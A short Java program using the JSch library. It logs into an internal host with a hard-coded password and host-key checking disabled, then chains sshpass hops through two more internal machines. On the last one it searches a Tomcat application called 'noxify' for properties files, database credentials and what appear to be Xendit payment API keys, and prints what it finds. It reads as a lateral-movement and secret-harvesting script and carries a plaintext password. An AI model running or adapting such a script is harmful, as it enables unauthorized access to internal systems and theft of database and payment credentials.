import com.jcraft.jsch.*;
import java.io.*;
class XM9 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.186 \"ls /progs/noxify/noxify-app/tomcat/7.0.109/webapps/noxify/ 2>/dev/null | head -10;echo ---CLASSES---;find /progs/noxify/noxify-app/tomcat/7.0.109/webapps/noxify/ -name \\\"*.properties\\\" 2>/dev/null | head -10;echo ---GREP-DB---;grep -rn \\\"db\\\\.pass\\\\|db\\\\.user\\\\|xendit\\\\|xnd_\\\" /progs/noxify/noxify-app/tomcat/7.0.109/webapps/noxify/WEB-INF/classes/ 2>/dev/null | head -10\" 2>&1' 2>&1 | head -30");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
